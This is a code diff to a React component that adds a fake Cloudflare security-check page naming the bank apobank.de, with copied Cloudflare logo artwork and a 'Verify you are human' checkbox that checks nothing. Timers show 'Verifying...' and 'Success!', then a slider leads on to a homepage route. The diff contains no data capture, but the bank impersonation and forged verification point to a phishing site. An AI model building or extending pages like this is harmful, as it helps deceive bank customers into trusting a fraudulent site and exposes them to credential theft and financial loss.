@@ -3,12 +3,15 @@ import { useNavigate } from "react-router-dom";
 import { ChevronsRight, Check } from "lucide-react";
 import Index from "./Index";
 
+type Phase = "idle" | "verifying" | "success" | "slider";
+
 const CfCaptcha = () => {
   const navigate = useNavigate();
   const trackRef = useRef<HTMLDivElement>(null);
   const [dragging, setDragging] = useState(false);
   const [x, setX] = useState(0);
   const [done, setDone] = useState(false);
+  const [phase, setPhase] = useState<Phase>("idle");
   const startXRef = useRef(0);
   const startPosRef = useRef(0);
   const KNOB = 44;
@@ -21,6 +24,15 @@ const CfCaptcha = () => {
   const finish = () => {
     setDone(true);
     setTimeout(() => navigate("/homepage"), 500);
+  };
+
+  const onCheck = () => {
+    if (phase !== "idle") return;
+    setPhase("verifying");
+    setTimeout(() => {
+      setPhase("success");
+      setTimeout(() => setPhase("slider"), 900);
+    }, 1400);
   };
 
   const onDown = (clientX: number) => {
@@ -74,6 +86,75 @@ const CfCaptcha = () => {
       window.removeEventListener("touchend", tu);
     };
   });
+
+  const CfBrand = () => (
+    <div className="flex flex-col items-end leading-tight select-none">
+      <div className="flex items-center gap-1">
+        <svg viewBox="0 0 60 24" className="h-4 w-auto" aria-hidden>
+          <path fill="#F38020" d="M45.6 12.2c-.3-.9-1-1.5-1.9-1.6l-14-.2c-.1 0-.2-.1-.3-.2 0-.1 0-.2.1-.3.1-.1.2-.1.3-.2L44 9.4c1.6-.1 3.4-1.4 4-3l.8-2.1c0-.1.1-.2 0-.3-.9-4-4.5-7-8.8-7-3.9 0-7.3 2.5-8.5 6.1-.8-.6-1.9-.9-3-.8-2 .2-3.6 1.8-3.8 3.8-.1.5 0 1 .1 1.5-3.3.1-5.9 2.8-5.9 6.1 0 .3 0 .6.1.9 0 .1.1.2.3.2h26.9c.2 0 .3-.1.3-.3l.1-.4c.1-.4.1-.7.1-1.1-.1-.4-.1-.6-.1-.6z"/>
+          <path fill="#FAAE40" d="M48.6 4.5h-.4c-.1 0-.2.1-.2.2l-.5 1.9c-.3.9-.2 1.8.2 2.4.4.6 1 .9 1.9 1l3 .2c.1 0 .2 0 .2.1.1.1.1.2 0 .3-.1.1-.2.1-.3.2l-3.1.2c-1.7.1-3.4 1.4-4 3l-.2.7c-.1.1 0 .3.2.3h10.6c.1 0 .2-.1.3-.2.2-.6.3-1.3.3-2 0-4.6-3.7-8.3-8-8.3z"/>
+        </svg>
+        <span className="text-[11px] font-bold tracking-wide text-slate-700">CLOUDFLARE</span>
+      </div>
+      <div className="text-[10px] text-slate-500">Privacy · Terms</div>
+    </div>
+  );
+
+  if (phase !== "slider") {
+    return (
+      <div className="relative min-h-screen overflow-hidden bg-white">
+        <div aria-hidden className="fixed inset-0 z-0 overflow-hidden pointer-events-none blur-md scale-105 select-none">
+          <Index />
+        </div>
+        <div className="fixed inset-0 z-50 bg-white/95 flex items-start justify-start px-6 sm:px-16 py-10 sm:py-16 overflow-auto">
+          <div className="w-full max-w-[640px]">
+            <h1 className="text-[22px] sm:text-[24px] font-semibold text-[#0f172a]">apobank.de</h1>
+            <h2 className="mt-3 text-[18px] sm:text-[20px] font-semibold text-[#0f172a]">
+              Checking if the site connection is secure
+            </h2>
+
+            <div className="mt-6 flex items-center justify-between gap-4 rounded-md border border-slate-200 bg-[#f7f8fa] px-5 py-4 max-w-[440px]">
+              <div className="flex items-center gap-3">
+                {phase === "idle" && (
+                  <>
+                    <button
+                      onClick={onCheck}
+                      aria-label="Verify you are human"
+                      className="h-6 w-6 rounded-sm border border-slate-400 bg-white hover:border-slate-600 transition"
+                    />
+                    <span className="text-[15px] text-[#0f172a]">Verify you are human</span>
+                  </>
+                )}
+                {phase === "verifying" && (
+                  <>
+                    <div className="h-6 w-6 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
+                    <span className="text-[15px] text-[#0f172a]">Verifying...</span>
+                  </>
+                )}
+                {phase === "success" && (
+                  <>
+                    <div className="h-6 w-6 rounded-full bg-[#2e7d32] flex items-center justify-center">
+                      <Check className="h-4 w-4 text-white" strokeWidth={3} />
+                    </div>
+                    <span className="text-[15px] text-[#0f172a]">Success!</span>
+                  </>
+                )}
+              </div>
+              <CfBrand />
+            </div>
+
+            <p className="mt-6 text-[14px] text-[#0f172a] max-w-[560px]">
+              apobank.de needs to review the security of your connection before proceeding.
+            </p>
+
+            <div className="mt-6 border-l-2 border-slate-300 pl-3">
+              <button className="text-[14px] text-[#0f172a] font-medium">Why am I seeing this page? ⌄</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="relative min-h-screen overflow-hidden bg-[#f5f7fa]">
